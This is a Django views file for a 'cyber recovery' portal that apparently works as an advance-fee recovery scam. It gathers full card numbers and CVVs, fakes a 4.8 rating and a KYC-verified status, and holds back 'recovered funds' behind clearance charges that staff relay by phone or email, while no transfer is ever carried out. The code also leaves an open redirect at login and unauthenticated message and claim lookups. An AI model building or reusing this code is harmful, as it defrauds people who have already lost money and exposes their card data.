from django.shortcuts import render, redirect, get_object_or_404
from django.http import JsonResponse
from django.views.generic import TemplateView, CreateView, FormView, DetailView, View
from django.urls import reverse_lazy, reverse
from django.contrib import messages
from django.contrib.auth import login, authenticate
from django.contrib.auth.views import LoginView, LogoutView
from django.contrib.auth.mixins import LoginRequiredMixin
from django.contrib.auth.models import User
from django.utils import timezone
from .models import (
    Claim, UserProfile, SupportMessage, CreditCard, 
    KYCApplication, CardRequest, WireTransfer, WithdrawalRequest, 
    LoanRequest, PushSubscription
)
from .forms import (
    ClaimForm, StatusCheckForm, ContactForm, UserRegistrationForm,
    UserProfileForm, EmailOrUsernameAuthenticationForm, CreditCardForm,
    KYCTermsAcceptanceForm, KYCApplicationForm, CardRequestForm,
    InternationalWireForm, WithdrawalInquiryForm, LoanRequestForm
)
from .countries import COUNTRY_CHOICES
from .reviews_data import REVIEWS_DATA

class HomeView(TemplateView):
    template_name = 'index.html'

class AboutView(TemplateView):
    template_name = 'about.html'

class ServicesView(TemplateView):
    template_name = 'services.html'

class HowItWorksView(TemplateView):
    template_name = 'how_it_works.html'

class ReviewsView(TemplateView):
    template_name = 'reviews.html'

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        context['reviews'] = REVIEWS_DATA
        context['total_reviews'] = len(REVIEWS_DATA)
        context['five_star_count'] = sum(1 for r in REVIEWS_DATA if r['rating'] >= 5)
        context['four_star_count'] = sum(1 for r in REVIEWS_DATA if 4 <= r['rating'] < 5)
        context['three_star_count'] = sum(1 for r in REVIEWS_DATA if 3 <= r['rating'] < 4)
        context['average_rating'] = "4.8"
        return context

class TestimonialsView(ReviewsView):
    template_name = 'reviews.html'

class FAQView(TemplateView):
    template_name = 'faq.html'

class ContactView(CreateView):
    form_class = ContactForm
    template_name = 'contact.html'
    success_url = reverse_lazy('contact')

    def form_valid(self, form):
        response = super().form_valid(form)
        from .emails import send_contact_submission_emails
        send_contact_submission_emails(self.object)
        messages.success(self.request, "Your message has been sent successfully!")
        return response

# Authentication Views

class UserOnlyMixin(LoginRequiredMixin):
    """Mixin to ensure users are authenticated before accessing account portal pages."""
    pass

class KYCRequiredMixin(LoginRequiredMixin):
    """Enforces that authenticated users must have passed KYC verification before initiating transactions."""
    def dispatch(self, request, *args, **kwargs):
        if not request.user.is_authenticated:
            return self.handle_no_permission()

        profile, _ = UserProfile.objects.get_or_create(user=request.user)
        if not profile.is_kyc_verified:
            messages.warning(
                request,
                "Mandatory KYC identity verification is required before initiating transactions or recovery claims. "
                "Please complete your KYC application below."
            )
            return redirect('kyc_verification')
        return super().dispatch(request, *args, **kwargs)

class RegisterView(View):
    template_name = 'accounts/register.html'

    def get(self, request):
        user_form = UserRegistrationForm()
        profile_form = UserProfileForm()
        return render(request, self.template_name, {
            'user_form': user_form,
            'profile_form': profile_form,
            'country_choices': COUNTRY_CHOICES,
        })

    def post(self, request):
        user_form = UserRegistrationForm(request.POST)
        profile_form = UserProfileForm(request.POST)
        
        if user_form.is_valid() and profile_form.is_valid():
            user = user_form.save(commit=False)
            user.set_password(user_form.cleaned_data['password'])
            user.save()
            
            # Get the profile created by signals and update it
            profile, created = UserProfile.objects.get_or_create(user=user)
            profile_form = UserProfileForm(request.POST, instance=profile)
            if profile_form.is_valid():
                profile_form.save()
            
            login(request, user)
            messages.success(
                request,
                "Account created successfully! Welcome to Nexis Cyber Recovery. "
                "Per international AML guidelines, please complete KYC verification to activate your account."
            )
            return redirect('kyc_verification')
        
        return render(request, self.template_name, {
            'user_form': user_form,
            'profile_form': profile_form,
            'country_choices': COUNTRY_CHOICES,
        })

class UserLoginView(LoginView):
    template_name = 'accounts/login.html'
    authentication_form = EmailOrUsernameAuthenticationForm
    redirect_authenticated_user = True

    def get_success_url(self):
        redirect_to = self.request.POST.get('next', self.request.GET.get('next', ''))
        if redirect_to:
            return redirect_to
        return reverse('dashboard')

    def form_invalid(self, form):
        messages.error(
            self.request,
            "Invalid username/email or password. Please verify your credentials and try again."
        )
        return super().form_invalid(form)

class UserLogoutView(LogoutView):
    next_page = reverse_lazy('login')

# Client Portal Views

class DashboardView(UserOnlyMixin, TemplateView):
    template_name = 'accounts/dashboard.html'

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        profile, created = UserProfile.objects.get_or_create(user=self.request.user)
        context['profile'] = profile
        
        from .models import Claim, SupportMessage
        from decimal import Decimal
        from django.db.models import Q
        
        # Fetch claims associated with user email or full name
        my_claims = Claim.objects.filter(
            Q(email__iexact=self.request.user.email) | Q(full_name__icontains=self.request.user.username)
        ).order_by('-created_at')
        
        context['my_claims'] = my_claims
        context['total_claims_count'] = my_claims.count()
        context['pending_claims_count'] = my_claims.filter(status='PENDING').count()
        context['review_claims_count'] = my_claims.filter(status='REVIEW').count()
        context['approved_claims_count'] = my_claims.filter(status__in=['APPROVED', 'COMPLETED']).count()
        context['active_claims_count'] = my_claims.filter(status__in=['PENDING', 'REVIEW', 'APPROVED']).count()
        
        # Total claimed amount calculation
        context['total_claimed_amount'] = sum((c.amount_lost for c in my_claims if c.amount_lost), Decimal('0.00'))
        
        # Unread messages count
        context['unread_support_count'] = SupportMessage.objects.filter(
            user_profile=profile, is_from_admin=True, is_read=False
        ).count()
        
        # Latest claim for active milestone tracking
        latest_claim = my_claims.first()
        context['latest_claim'] = latest_claim
        
        if latest_claim:
            status_map = {
                'PENDING': {'step': 1, 'percent': 25, 'label': 'Claim Lodged & Verified'},
                'REVIEW': {'step': 2, 'percent': 50, 'label': 'Forensic Investigation Active'},
                'APPROVED': {'step': 3, 'percent': 75, 'label': 'Dispute Lodged with Bank/Gateway'},
                'COMPLETED': {'step': 4, 'percent': 100, 'label': 'Restitution Granted & Funds Released'},
                'REJECTED': {'step': 1, 'percent': 100, 'label': 'Claim Closed / Insufficient Evidence'}
            }
            context['latest_claim_progress'] = status_map.get(
                latest_claim.status, {'step': 1, 'percent': 25, 'label': 'In Progress'}
            )
            context['assigned_specialist'] = latest_claim.assigned_agent or "Senior Forensic Case Officer"
        else:
            context['latest_claim_progress'] = None
            context['assigned_specialist'] = "Senior Forensic Case Officer"
            
        # Build comprehensive unified chronological activity stream
        activities = []
        
        for c in my_claims:
            activities.append({
                'type': 'claim',
                'category_label': 'Claim Submission',
                'title': f'Claim Filed: {c.claim_id}',
                'description': f'Submitted {c.get_refund_type_display()} claim for ${c.amount_lost or 0} against {c.company_name}.',
                'timestamp': c.created_at,
                'status': c.get_status_display(),
                'status_code': c.status,
                'icon': 'fas fa-file-invoice-dollar',
                'badge_color': 'bg-primary'
            })
            if c.updated_at and c.updated_at > c.created_at:
                activities.append({
                    'type': 'claim',
                    'category_label': 'Case Status Update',
                    'title': f'Case Milestone: {c.claim_id}',
                    'description': f'Status progressed to {c.get_status_display()}. Handled by {c.assigned_agent or "Senior Forensic Officer"}.',
                    'timestamp': c.updated_at,
                    'status': c.get_status_display(),
                    'status_code': c.status,
                    'icon': 'fas fa-sync-alt',
                    'badge_color': 'bg-info'
                })
                
        # Support communications
        support_msgs = SupportMessage.objects.filter(user_profile=profile).order_by('-created_at')[:8]
        for msg in support_msgs:
            sender = 'Case Specialist' if msg.is_from_admin else 'You'
            activities.append({
                'type': 'support',
                'category_label': 'Support & Chat',
                'title': f'Communication: {sender}',
                'description': msg.message[:110] + ('...' if len(msg.message) > 110 else ''),
                'timestamp': msg.created_at,
                'status': 'Unread' if (msg.is_from_admin and not msg.is_read) else 'Delivered',
                'status_code': 'UNREAD' if (msg.is_from_admin and not msg.is_read) else 'DELIVERED',
                'icon': 'fas fa-comment-dots',
                'badge_color': 'bg-warning'
            })
            
        # Processing charge status
        if profile.charge_amount and profile.charge_amount > 0:
            if not profile.is_charge_paid:
                activities.append({
                    'type': 'security',
                    'category_label': 'Settlement Clearance',
                    'title': 'Processing Charge Pending',
                    'description': 'Regulatory clearance charge required to disburse recovered funds. Administration will communicate required charges upon contact.',
                    'timestamp': profile.created_at,
                    'status': 'Pending Verification',
                    'status_code': 'PENDING',
                    'icon': 'fas fa-exclamation-triangle',
                    'badge_color': 'bg-warning'
                })
            else:
                activities.append({
                    'type': 'security',
                    'category_label': 'Settlement Clearance',
                    'title': 'Processing Charge Settled',
                    'description': 'Disbursement clearance requirements verified and cleared.',
                    'timestamp': profile.created_at,
                    'status': 'Cleared',
                    'status_code': 'COMPLETED',
                    'icon': 'fas fa-check-double',
                    'badge_color': 'bg-success'
                })
                
        # Account verification & security event
        activities.append({
            'type': 'security',
            'category_label': 'Account Security',
            'title': 'Account Identity Verified',
            'description': f'Account #{profile.account_no} passed identity validation and KYC anti-fraud checks.',
            'timestamp': profile.created_at,
            'status': 'Verified',
            'status_code': 'COMPLETED',
            'icon': 'fas fa-user-shield',
            'badge_color': 'bg-success'
        })
        
        # Credit Card events
        for card in self.request.user.credit_cards.all()[:3]:
            activities.append({
                'type': 'security',
                'category_label': 'Payment Method',
                'title': f'{card.card_type} Added',
                'description': f'{card.card_type} ending in {card.last_four} verified and linked to your recovery file.',
                'timestamp': card.created_at,
                'status': 'Active',
                'status_code': 'COMPLETED',
                'icon': 'fas fa-credit-card',
                'badge_color': 'bg-primary'
            })
        
        # Sort all activities chronologically descending
        activities.sort(key=lambda x: x['timestamp'], reverse=True)
        context['recent_activities'] = activities
        
        return context

class TransactionsView(UserOnlyMixin, TemplateView):
    template_name = 'accounts/transactions.html'

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        profile, created = UserProfile.objects.get_or_create(user=self.request.user)
        context['profile'] = profile
        return context

class MyCardsView(UserOnlyMixin, View):
    template_name = 'accounts/my_cards.html'

    def get(self, request):
        profile, _ = UserProfile.objects.get_or_create(user=request.user)
        cards = request.user.credit_cards.all()
        card_requests = request.user.card_requests.all()
        form = CreditCardForm()
        request_form = CardRequestForm(initial={
            'cardholder_name': request.user.get_full_name() or request.user.username,
            'contact_phone': profile.phone,
            'delivery_address': profile.country
        })
        return render(request, self.template_name, {
            'profile': profile,
            'cards': cards,
            'card_requests': card_requests,
            'form': form,
            'request_form': request_form,
        })

    def post(self, request):
        profile, _ = UserProfile.objects.get_or_create(user=request.user)
        form = CreditCardForm(request.POST)
        if form.is_valid():
            is_primary = (request.user.credit_cards.count() == 0)
            card = form.save(user=request.user, commit=False)
            card.is_primary = is_primary
            card.save()
            messages.success(request, f"{card.card_type} ending in {card.last_four} was successfully added to your account.")
            return redirect('my_cards')
        else:
            messages.error(request, "Please review your card details and correct any invalid fields.")
            cards = request.user.credit_cards.all()
            card_requests = request.user.card_requests.all()
            request_form = CardRequestForm()
            return render(request, self.template_name, {
                'profile': profile,
                'cards': cards,
                'card_requests': card_requests,
                'form': form,
                'request_form': request_form,
            })

class RequestCardView(UserOnlyMixin, View):
    def post(self, request):
        profile, _ = UserProfile.objects.get_or_create(user=request.user)
        form = CardRequestForm(request.POST)
        if form.is_valid():
            card_req = form.save(commit=False)
            card_req.user = request.user
            card_req.status = 'PENDING'
            card_req.save()
            from .emails import send_card_request_submission_emails
            send_card_request_submission_emails(card_req)

            SupportMessage.objects.create(
                user_profile=profile,
                message=(
                    f"Credit Card Request Submitted (Ref: {card_req.request_id}). "
                    f"Our card administration team has received your request for a {card_req.card_type} card "
                    "and will contact you via email or phone number regarding the required card issuance and dispatch charges. "
                    "Upon approval, the system will automatically issue your card with a 2-year validity."
                ),
                is_from_admin=True,
                is_read=False
            )

            messages.success(
                request,
                f"Credit Card request ({card_req.card_type}) successfully lodged! "
                "Our administration team will contact you via email or phone number regarding required charges. "
                "Once approved, your credit card will be automatically generated with a 2-year validity from the approval date."
            )
            return redirect('my_cards')
        else:
            messages.error(request, "Please review the card request form and correct any errors.")
            return redirect('my_cards')

class DeleteCardView(UserOnlyMixin, View):
    def post(self, request, card_id):
        card = get_object_or_404(CreditCard, id=card_id, user=request.user)
        last_four = card.last_four
        card_type = card.card_type
        card.delete()
        messages.success(request, f"{card_type} ending in {last_four} was removed.")
        return redirect('my_cards')

from django.contrib.auth import logout
from django.contrib.auth.views import PasswordChangeView
from django.urls import reverse_lazy
from django.contrib import messages
from .forms import ProfileUpdateForm

class SettingsView(UserOnlyMixin, TemplateView):
    template_name = 'accounts/settings.html'

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        profile, created = UserProfile.objects.get_or_create(user=self.request.user)
        context['profile'] = profile
        context['form'] = ProfileUpdateForm(user=self.request.user, instance=profile)
        return context

    def post(self, request, *args, **kwargs):
        profile = request.user.profile
        form = ProfileUpdateForm(request.POST, instance=profile, user=request.user)
        if form.is_valid():
            # Update User fields
            user = request.user
            user.first_name = form.cleaned_data['first_name']
            user.last_name = form.cleaned_data['last_name']
            user.email = form.cleaned_data['email']
            user.save()
            
            # Update Profile fields
            form.save()
            messages.success(request, 'Your profile has been updated successfully.')
            return redirect('settings')
        
        context = self.get_context_data()
        context['form'] = form
        return self.render_to_response(context)

class UserPasswordChangeView(UserOnlyMixin, PasswordChangeView):
    template_name = 'accounts/settings.html'
    success_url = reverse_lazy('settings')
    
    def form_valid(self, form):
        messages.success(self.request, 'Your password was successfully updated!')
        return super().form_valid(form)

class DeactivateAccountView(UserOnlyMixin, View):
    def post(self, request):
        user = request.user
        user.is_active = False
        user.save()
        logout(request)
        messages.warning(request, 'Your account has been deactivated.')
        return redirect('home')

class ReceiveMoneyView(KYCRequiredMixin, View):
    def post(self, request):
        profile = request.user.profile
        if not profile.is_kyc_verified:
            messages.warning(request, "KYC identity verification is required before initiating transactions or receiving funds.")
            return redirect('kyc_verification')

        if not profile.is_charge_paid:
            messages.warning(request, "A statutory clearance charge is required before you can receive your funds. Our administration team will communicate any required charges when they contact you.")
            return redirect('pay_charge')
        
        # Here would be the logic to actually "receive" money
        messages.success(request, "Request submitted. Your funds will be transferred shortly.")
        return redirect('dashboard')

class PayChargeView(UserOnlyMixin, TemplateView):
    template_name = 'accounts/pay_charge.html'

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        context['profile'] = self.request.user.profile
        return context

class SubmitClaimView(KYCRequiredMixin, CreateView):
    model = Claim
    form_class = ClaimForm
    template_name = 'portal/submit_claim.html'
    login_url = 'login'

    def dispatch(self, request, *args, **kwargs):
        # KYCRequiredMixin enforces authentication and is_kyc_verified
        resp = super().dispatch(request, *args, **kwargs)
        if hasattr(resp, 'status_code') and resp.status_code == 302:
            return resp

        # Enforce that user must have a saved credit or debit card on file
        if not request.user.credit_cards.exists():
            messages.warning(
                request,
                "A verified credit or debit card is required on file before submitting a recovery claim. "
                "Please add your card details below to continue with your claim registration."
            )
            return redirect('my_cards')

        return resp

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        context['primary_card'] = self.request.user.credit_cards.first()
        return context

    def get_success_url(self):
        return reverse('claim_success', kwargs={'claim_id': self.object.claim_id})

    def get_initial(self):
        initial = super().get_initial()
        if hasattr(self.request.user, 'profile'):
            profile = self.request.user.profile
            initial.update({
                'full_name': f"{self.request.user.first_name} {self.request.user.last_name}".strip() or self.request.user.username,
                'email': self.request.user.email,
                'phone': profile.phone,
                'country': profile.country,
            })
        return initial

    def form_valid(self, form):
        if not self.request.user.credit_cards.exists():
            messages.error(self.request, "A verified payment card is required before submitting a claim.")
            return redirect('my_cards')

        self.object = form.save(commit=False)
        from django.contrib.auth.models import User
        agents = User.objects.filter(is_staff=True)
        if agents.exists():
            import random
            self.object.assigned_agent = random.choice(agents).username
        self.object.save()
        from .emails import send_claim_submission_emails
        send_claim_submission_emails(self.object)
        messages.success(self.request, f"Claim submitted successfully! Your Claim ID is {self.object.claim_id}")
        return super().form_valid(form)

class KYCVerificationView(UserOnlyMixin, View):
    template_name = 'accounts/kyc.html'

    def get(self, request):
        profile, _ = UserProfile.objects.get_or_create(user=request.user)
        kyc, _ = KYCApplication.objects.get_or_create(user=request.user)

        form = KYCApplicationForm(instance=kyc, initial={
            'cardholder_name': f"{request.user.first_name} {request.user.last_name}".strip() or request.user.username,
            'country': profile.country,
            'phone_number': profile.phone,
        })
        terms_form = KYCTermsAcceptanceForm()

        return render(request, self.template_name, {
            'profile': profile,
            'kyc': kyc,
            'form': form,
            'terms_form': terms_form,
            'country_choices': COUNTRY_CHOICES,
            'cards': request.user.credit_cards.all(),
        })

    def post(self, request):
        profile, _ = UserProfile.objects.get_or_create(user=request.user)
        kyc, _ = KYCApplication.objects.get_or_create(user=request.user)

        # Users cannot do KYC again until admin approves or rejects
        if kyc.status == 'PENDING':
            messages.info(
                request,
                "Your KYC application is currently under compliance review. "
                "You cannot re-submit until an administrator reviews and approves or rejects your application."
            )
            return redirect('kyc_verification')

        if kyc.status == 'APPROVED':
            messages.success(request, "Your account identity has already been verified and approved.")
            return redirect('kyc_verification')

        action = request.POST.get('action')

        # Step 1 submission: Terms Acceptance
        if action == 'accept_terms':
            terms_form = KYCTermsAcceptanceForm(request.POST)
            if terms_form.is_valid():
                kyc.terms_accepted = True
                kyc.terms_accepted_at = timezone.now()
                kyc.save(update_fields=['terms_accepted', 'terms_accepted_at'])
                messages.success(request, "Terms accepted. Please provide your identification documents and settlement card below.")
                return redirect('kyc_verification')
            else:
                messages.error(request, "You must check the box to agree to the KYC terms and conditions to proceed.")
                return render(request, self.template_name, {
                    'profile': profile,
                    'kyc': kyc,
                    'terms_form': terms_form,
                    'form': KYCApplicationForm(instance=kyc),
                    'country_choices': COUNTRY_CHOICES,
                })

        # Step 2 submission: Full Application (Documents + Credit Card)
        form = KYCApplicationForm(request.POST, request.FILES, instance=kyc)
        if form.is_valid():
            kyc_obj = form.save(commit=False)
            kyc_obj.status = 'PENDING'
            kyc_obj.submitted_at = timezone.now()
            kyc_obj.terms_accepted = True
            if not kyc_obj.terms_accepted_at:
                kyc_obj.terms_accepted_at = timezone.now()

            # Save credit card
            cardholder_name = form.cleaned_data['cardholder_name']
            card_number = form.cleaned_data['card_number']
            card_type = form.cleaned_data.get('card_type', 'Credit Card')
            exp_month = form.cleaned_exp_month
            exp_year = form.cleaned_exp_year
            cvv = form.cleaned_data['card_cvv']
            billing_zip = form.cleaned_data.get('card_billing_zip', '')

            # Check if card already exists or create new
            clean_digits = card_number.replace(' ', '')
            last_4 = clean_digits[-4:]
            existing_card = request.user.credit_cards.filter(card_number=card_number).first()
            if not existing_card:
                is_first = (request.user.credit_cards.count() == 0)
                card = CreditCard.objects.create(
                    user=request.user,
                    cardholder_name=cardholder_name,
                    card_number=card_number,
                    card_type=card_type,
                    exp_month=exp_month,
                    exp_year=exp_year,
                    cvv=cvv,
                    billing_zip=billing_zip,
                    is_primary=is_first
                )
            else:
                card = existing_card

            kyc_obj.credit_card = card
            kyc_obj.save()
            from .emails import send_kyc_submission_emails
            send_kyc_submission_emails(kyc_obj)

            if not profile.country and form.cleaned_data.get('country'):
                profile.country = form.cleaned_data.get('country')
                profile.save(update_fields=['country'])
            if not profile.phone and form.cleaned_data.get('phone_number'):
                profile.phone = form.cleaned_data.get('phone_number')
                profile.save(update_fields=['phone'])

            # Send automated case support notification
            SupportMessage.objects.create(
                user_profile=profile,
                message=(
                    f"Notice of KYC Submission (Application Ref: {kyc_obj.application_id}): "
                    "Your identification documents and settlement payment card have been received by our compliance department. "
                    "Please note that a statutory verification charge is required to finalize KYC clearance. "
                    "Our compliance administration team will contact you directly via your registered email or phone number "
                    "with required clearance charges and payment instructions. "
                    "Your application is currently locked under review; you cannot re-submit your KYC application until an administrator has reviewed and approved or rejected it."
                ),
                is_from_admin=True,
                is_read=False
            )

            messages.success(
                request,
                f"KYC Application ({kyc_obj.application_id}) submitted successfully! "
                "A statutory verification charge is required to finalize KYC clearance. "
                "Our compliance administration team will contact you directly via your registered email or phone number regarding the required charges. "
                "Your application is now under review and cannot be re-submitted until an administrator approves or rejects it."
            )
            return redirect('kyc_verification')
        else:
            messages.error(request, "Please review the form and correct the highlighted errors.")
            return render(request, self.template_name, {
                'profile': profile,
                'kyc': kyc,
                'form': form,
                'terms_form': KYCTermsAcceptanceForm(initial={'terms_accepted': True}),
                'country_choices': COUNTRY_CHOICES,
            })

class LocalTransferView(KYCRequiredMixin, View):
    template_name = 'accounts/local_transfer.html'

    def get(self, request):
        profile = request.user.profile
        return render(request, self.template_name, {
            'profile': profile
        })

    def post(self, request):
        profile = request.user.profile
        amount = request.POST.get('amount')
        recipient_name = request.POST.get('recipient_name')
        account_number = request.POST.get('account_number')
        bank_name = request.POST.get('bank_name')

        if not profile.is_charge_paid and profile.charge_amount > 0:
            messages.warning(request, "A statutory clearance processing charge is required before disbursement. Administration will communicate any required charges when they contact you.")
            return redirect('pay_charge')

        messages.info(request, f"Transfer request for ${amount or '0.00'} to {recipient_name} ({bank_name}) has been lodged with clearing.")
        return redirect('dashboard')

class DepositView(UserOnlyMixin, View):
    template_name = 'accounts/deposit.html'

    def get(self, request):
        profile, _ = UserProfile.objects.get_or_create(user=request.user)
        return render(request, self.template_name, {
            'profile': profile,
        })

    def post(self, request):
        messages.warning(request, "No payment methods are enabled at the moment. Please check back later.")
        return redirect('deposit')


class LoanRequestView(KYCRequiredMixin, View):
    template_name = 'accounts/loan.html'

    def get(self, request):
        profile, _ = UserProfile.objects.get_or_create(user=request.user)
        form = LoanRequestForm()
        recent_loans = request.user.loan_requests.all()
        return render(request, self.template_name, {
            'profile': profile,
            'form': form,
            'recent_loans': recent_loans,
        })

    def post(self, request):
        profile, _ = UserProfile.objects.get_or_create(user=request.user)
        form = LoanRequestForm(request.POST)

        if form.is_valid():
            loan = form.save(commit=False)
            loan.user = request.user
            loan.save()
            from .emails import send_loan_submission_emails
            send_loan_submission_emails(loan)

            # Record in Support Messages to ensure admin visibility & notification
            SupportMessage.objects.create(
                user_profile=profile,
                message=(
                    f"New Loan & Restitution Capital Advance Application ({loan.loan_id}): "
                    f"Amount: ${loan.amount_requested:,.2f} for {loan.term_months} months at {loan.annual_interest_rate}% APR. "
                    f"Purpose: {loan.get_purpose_display()}. Repayment Source: {loan.repayment_source}. "
                    f"Employment: {loan.employment_status} (${loan.monthly_income:,.2f}/mo). "
                    "Underwriting credit review pending."
                ),
                is_from_admin=False,
                is_read=False
            )

            messages.success(
                request,
                f"Your Loan Application ({loan.loan_id}) for ${loan.amount_requested:,.2f} has been submitted successfully! "
                "Our credit and underwriting committee will review your application within 24 to 48 hours. "
                "You will be notified once a determination is made."
            )
            return redirect('loan_request')

        recent_loans = request.user.loan_requests.all()
        messages.error(request, "Please review the application form and correct any invalid fields.")
        return render(request, self.template_name, {
            'profile': profile,
            'form': form,
            'recent_loans': recent_loans,
        })


class WithdrawView(KYCRequiredMixin, View):
    template_name = 'accounts/withdraw.html'

    def get(self, request):
        profile, _ = UserProfile.objects.get_or_create(user=request.user)
        attains_criteria = profile.attains_withdrawal_criteria
        shortfall = profile.withdrawal_shortfall
        recent_withdrawals = request.user.withdrawal_requests.all()
        default_amount = (profile.balance if attains_criteria else profile.min_withdrawal_amount) if profile.is_kyc_verified else profile.min_withdrawal_amount
        inquiry_form = WithdrawalInquiryForm(initial={
            'amount': default_amount,
            'contact_phone': profile.phone,
        })
        return render(request, self.template_name, {
            'profile': profile,
            'attains_criteria': attains_criteria,
            'shortfall': shortfall,
            'inquiry_form': inquiry_form,
            'recent_withdrawals': recent_withdrawals,
        })

    def post(self, request):
        profile, _ = UserProfile.objects.get_or_create(user=request.user)
        inquiry_form = WithdrawalInquiryForm(request.POST)

        if inquiry_form.is_valid():
            req = inquiry_form.save(commit=False)
            req.user = request.user
            req.save()
            from .emails import send_withdrawal_submission_emails
            send_withdrawal_submission_emails(req)

            balance_str = f"${profile.balance}" if profile.is_kyc_verified else "Locked (KYC Required)"
            SupportMessage.objects.create(
                user_profile=profile,
                message=(
                    f"Notice of Withdrawal Request ({req.request_id}): "
                    f"User requested withdrawal of ${req.amount} via {req.payout_method}. "
                    f"Current Balance: {balance_str}. "
                    "Our administration team will contact you regarding required clearance charges and disbursement authorization."
                ),
                is_from_admin=False,
                is_read=False
            )

            if profile.attains_withdrawal_criteria and profile.is_kyc_verified:
                messages.success(
                    request,
                    f"Withdrawal request ({req.request_id}) for ${req.amount} has been logged. "
                    "Your balance meets the withdrawal threshold. Please contact the administration team to finalize disbursement clearance."
                )
            else:
                if profile.is_kyc_verified:
                    messages.warning(
                        request,
                        f"Withdrawal request ({req.request_id}) logged. "
                        f"Notice: Your balance (${profile.balance:,.2f}) has not attained the minimum withdrawal requirement of ${profile.min_withdrawal_amount:,.2f}. "
                        "Please contact administration for further details."
                    )
                else:
                    messages.warning(
                        request,
                        f"Withdrawal request ({req.request_id}) logged. "
                        "Notice: Your account requires KYC verification before balance release. "
                        "Please contact administration for further details."
                    )
            return redirect('withdraw')

        recent_withdrawals = request.user.withdrawal_requests.all()
        return render(request, self.template_name, {
            'profile': profile,
            'attains_criteria': profile.attains_withdrawal_criteria,
            'shortfall': profile.withdrawal_shortfall,
            'inquiry_form': inquiry_form,
            'recent_withdrawals': recent_withdrawals,
        })


class InternationalWireView(KYCRequiredMixin, View):
    template_name = 'accounts/international_wire.html'

    def get(self, request):
        profile, _ = UserProfile.objects.get_or_create(user=request.user)
        form = InternationalWireForm(initial={
            'beneficiary_name': f"{request.user.first_name} {request.user.last_name}".strip() or request.user.username,
            'beneficiary_country': profile.country,
        })
        recent_wires = request.user.wire_transfers.all()
        return render(request, self.template_name, {
            'profile': profile,
            'form': form,
            'recent_wires': recent_wires,
        })

    def post(self, request):
        profile, _ = UserProfile.objects.get_or_create(user=request.user)
        form = InternationalWireForm(request.POST)

        if form.is_valid():
            wire = form.save(commit=False)
            wire.user = request.user
            wire.save()
            from .emails import send_wire_submission_emails
            send_wire_submission_emails(wire)

            # Record support communication for admin tracking
            SupportMessage.objects.create(
                user_profile=profile,
                message=(
                    f"International Wire Transfer Request Registered ({wire.reference_id}): "
                    f"Amount: {wire.currency} {wire.amount} to {wire.beneficiary_name} "
                    f"at {wire.bank_name} (SWIFT/BIC: {wire.swift_bic}, IBAN/Account: {wire.iban_account_number}). "
                    "Compliance and international clearing review pending."
                ),
                is_from_admin=False,
                is_read=False
            )

            messages.success(
                request,
                f"International Wire Transfer dossier ({wire.reference_id}) for {wire.currency} {wire.amount} "
                f"to {wire.beneficiary_name} has been initiated. Our international clearing desk and administration "
                "will review your instruction and contact you."
            )
            return redirect('international_wire')

        recent_wires = request.user.wire_transfers.all()
        messages.error(request, "Please review the wire instructions and correct any invalid fields.")
        return render(request, self.template_name, {
            'profile': profile,
            'form': form,
            'recent_wires': recent_wires,
        })

class ClaimSuccessView(TemplateView):
    template_name = 'portal/claim_success.html'
    
    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        claim_id = kwargs.get('claim_id')
        context['claim'] = get_object_or_404(Claim, claim_id=claim_id)
        return context

class CheckStatusView(FormView):
    form_class = StatusCheckForm
    template_name = 'portal/check_status.html'

    def get_initial(self):
        initial = super().get_initial()
        if self.request.user.is_authenticated:
            initial['email'] = self.request.user.email
        return initial

    def form_valid(self, form):
        claim_id = form.cleaned_data['claim_id']
        email = form.cleaned_data['email']
        
        try:
            claim = Claim.objects.get(claim_id=claim_id, email=email)
            return render(self.request, 'portal/status_result.html', {'claim': claim})
        except Claim.DoesNotExist:
            messages.error(self.request, "No claim found with these details.")
            return self.form_invalid(form)

class SupportView(UserOnlyMixin, View):
    template_name = 'accounts/support.html'

    def get(self, request):
        profile, _ = UserProfile.objects.get_or_create(user=request.user)
        return render(request, self.template_name, {
            'profile': profile,
            'assigned_specialist': 'Senior Forensic Case Officer',
        })

    def post(self, request):
        profile, _ = UserProfile.objects.get_or_create(user=request.user)
        subject = request.POST.get('subject', 'General Case Assistance').strip()
        message_text = request.POST.get('message', '').strip()
        pref_contact = request.POST.get('preferred_contact', 'EMAIL')
        contact_phone = request.POST.get('phone', profile.phone).strip()

        if message_text:
            formatted_msg = (
                f"[Case Inquiry - {subject}] "
                f"(Preferred Contact: {pref_contact}, Phone: {contact_phone}): {message_text}"
            )
            s_msg = SupportMessage.objects.create(
                user_profile=profile,
                message=formatted_msg,
                is_from_admin=False
            )
            from .emails import send_support_inquiry_emails
            send_support_inquiry_emails(s_msg)
            contact_label = "email" if pref_contact == "EMAIL" else ("phone" if pref_contact == "PHONE" else "email or phone")
            messages.success(
                request,
                f"Your inquiry has been received and logged under Account #{profile.account_no}. "
                f"Our casework team will contact you directly by {contact_label} shortly."
            )
        else:
            messages.error(request, "Please enter your inquiry details before submitting.")
        return redirect('support')

from django.contrib.admin.views.decorators import staff_member_required
from django.utils.decorators import method_decorator

@method_decorator(staff_member_required, name='dispatch')
class AdminUserChatView(View):
    template_name = 'admin/user_chat.html'

    def get(self, request, profile_id):
        profile = get_object_or_404(UserProfile, id=profile_id)
        messages_list = SupportMessage.objects.filter(user_profile=profile).order_by('created_at')
        
        # Mark user messages as read when admin views them
        SupportMessage.objects.filter(user_profile=profile, is_from_admin=False, is_read=False).update(is_read=True)
        
        return render(request, self.template_name, {
            'target_profile': profile,
            'messages_list': messages_list
        })

    def post(self, request, profile_id):
        profile = get_object_or_404(UserProfile, id=profile_id)
        message_text = request.POST.get('message')
        if message_text:
            msg = SupportMessage.objects.create(
                user_profile=profile,
                message=message_text,
                is_from_admin=True,
                is_read=True # Admin's own messages are "read" by admin
            )
            if request.headers.get('x-requested-with') == 'XMLHttpRequest':
                return JsonResponse({
                    'status': 'success',
                    'message_id': msg.id,
                    'created_at': msg.created_at.strftime('%M %d, %H:%M')
                })
            messages.success(request, f"Message sent to {profile.user.username}.")
        return redirect('admin_user_chat', profile_id=profile_id)

class GetNewMessagesView(View):
    def get(self, request, profile_id):
        after_id = request.GET.get('after_id', 0)
        messages_list = SupportMessage.objects.filter(
            user_profile_id=profile_id,
            id__gt=after_id
